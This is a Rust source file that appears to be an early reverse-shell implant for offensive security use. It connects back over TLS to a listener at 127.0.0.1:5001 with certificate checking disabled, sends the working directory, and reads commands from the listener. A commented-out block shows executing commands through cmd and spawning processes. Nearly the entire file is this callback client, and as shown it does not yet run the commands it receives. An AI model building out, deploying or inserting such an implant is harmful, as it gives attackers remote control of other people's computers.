/*use std::process::Command;

fn main() {
    //executes process via cmd in the same process context with .output
    if let Ok(command) = Command::new("cmd").arg("/c").arg("dir").output() {
        println!("{}",String::from_utf8_lossy(&command.stdout))
    }
    //Spawns a new process with .spawn
    Command::new("notepad").spawn();
}*/

use std::io::{Read, Write};
use std::net;
use std::net::{Ipv4Addr, TcpStream, SocketAddr};
use std::process::{Command, Stdio};
use std::str;
use std::thread;
use std::path::Path;
use openssl::ssl::{SslMethod, SslConnector};
use std::ffi::OsStr;
use std::env;
fn main() {
    let mut build = SslConnector::builder(SslMethod::tls()).unwrap();
    build.set_verify(openssl::ssl::SslVerifyMode::NONE);
    let connector = build.build();
	let addr = Ipv4Addr::new(127,0,0,1);
	let sockettest = SocketAddr::from((addr,5001));
	let convertsocket = sockettest.to_string();
	let convertip = addr.to_string();
    let stream = TcpStream::connect(&convertsocket).unwrap();
    let mut stream = connector.connect(&convertip,stream).unwrap();
    loop {
        let mut Commander = [0 as u8; 512];
        let cwd = env::current_dir().unwrap();
        let my_cwd = cwd.into_os_string().into_string().unwrap();

          
        stream.write_all(my_cwd.as_bytes());

        stream.read(&mut Commander);
        let my_string = String::from_utf8_lossy(&Commander);
        let mut splitted = my_string.split("\r");
        println!("{:?}",splitted.next().unwrap());
        stream.write_all(b"RUST IS GOOD FOR OFFSEC");
    }
}